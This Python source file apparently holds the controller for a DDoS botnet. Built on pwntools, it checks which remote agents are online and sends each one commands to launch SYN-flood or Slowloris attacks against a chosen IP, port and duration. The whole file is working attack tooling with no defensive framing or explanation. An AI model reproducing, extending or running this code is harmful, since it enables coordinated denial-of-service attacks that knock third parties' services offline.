import pwn
class Executor:
    def __init__(self, inputed_type):
        self.type = inputed_type
    
    def ping(self , port , address):
        try:
            print(port)
            instance = pwn.remote(address, port,timeout=10)
            state = instance.sendline(b'3')
            c_state = instance.recvall()
            print(c_state)
            instance.close()
            print(state)
            return {"state": "online"}
        except Exception as e:
            print(e)
            return {"state": 'offline'}
    
    def synflood(self, data, ip, port, duration,thread):
        print(data)
        fail = list()
        for i in data:
            print(i)
            try:
                instance = pwn.remote(i['ip'], i['port'], timeout=6)
                instance.sendline(b'1')
                instance.sendline(bytes(ip, encoding='utf-8'))
                instance.sendline(bytes(port, encoding='utf-8'))
                instance.sendline(bytes(thread, encoding='utf-8'))
                instance.sendline(bytes(duration, encoding='utf-8'))
                instance.close()
            
            except Exception as e:
                print(e)
                fail.append(i)
            
        return fail
        
    def slowloris(self, data, ip, port, sockets,duration):
        print(data)
        fail = list()
        
        for i in data:
            print(i)
            try:
                instance = pwn.remote(i['ip'], i['port'], timeout=6)
                instance.sendline(b'2') 
                instance.sendline(bytes(ip, encoding='utf-8'))
                instance.sendline(bytes(port, encoding='utf-8'))
                instance.sendline(bytes(sockets, encoding='utf-8'))
                instance.sendline(bytes(duration, encoding='utf-8'))

                instance.close()
            
            except Exception as e:
                print(e)
                fail.append(i)
        
        return fail